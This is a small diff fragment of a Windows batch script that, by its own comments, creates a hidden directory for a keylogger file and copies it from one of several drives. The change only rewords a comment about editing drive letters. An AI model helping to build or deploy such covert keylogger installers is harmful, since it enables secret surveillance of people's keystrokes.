@@ -10,7 +10,7 @@ cd ..
 :: Make directory in which keylogger file will hide itself in
 mkdir testdirect
 
-:: I put a few drives, since lots of computers differ, please make changes as needed
+:: I put a few drives, since lots of computers differ, if changes need to be made copy and paste the drive and the path and change the letter of the drives.
 :: My code was in the E: Drive, but as mentioned, change as needed
 :: If drive is not found it will skip over it
 
